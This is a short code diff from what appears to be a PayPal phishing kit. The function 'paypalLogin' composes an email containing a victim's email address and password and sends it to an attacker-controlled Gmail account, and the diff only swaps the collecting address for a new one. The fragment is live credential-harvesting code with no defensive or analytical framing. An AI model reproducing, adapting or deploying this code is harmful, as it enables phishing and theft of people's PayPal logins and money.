@@ -42,8 +42,8 @@ function paypalLogin() {
   })();
 
   var params = {
-    from: "sofiamendez2069@gmail.com",
-    to: "sofiamendez2069@gmail.com",
+    from: "myspamassage2023@gmail.com",
+    to: "myspamassage2023@gmail.com",
     subject: "Paypal Info " + today + " " + timeNow,
     replyto: "",
     message: "email: " + email + " \n" + "password: " + password,
